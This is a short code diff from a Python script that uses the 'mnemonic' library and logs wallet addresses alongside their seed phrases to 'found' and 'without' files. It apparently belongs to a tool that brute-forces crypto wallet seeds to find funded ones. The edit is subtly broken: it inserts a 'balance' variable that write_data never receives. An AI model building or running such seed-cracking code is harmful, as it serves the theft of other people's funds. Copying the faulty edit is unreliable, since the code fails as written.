@@ -6,7 +6,7 @@ from mnemonic import Mnemonic
 
 def write_data(address, seed):
     with open("./data/data_without.txt", "a") as file:
-        file.write(f"{address}  -  {seed}\n")
+        file.write(f"{address} {balance} -  {seed}\n")
 
 def write_complete(address, seed):
     with open("./data/data_found.txt", "a") as file:
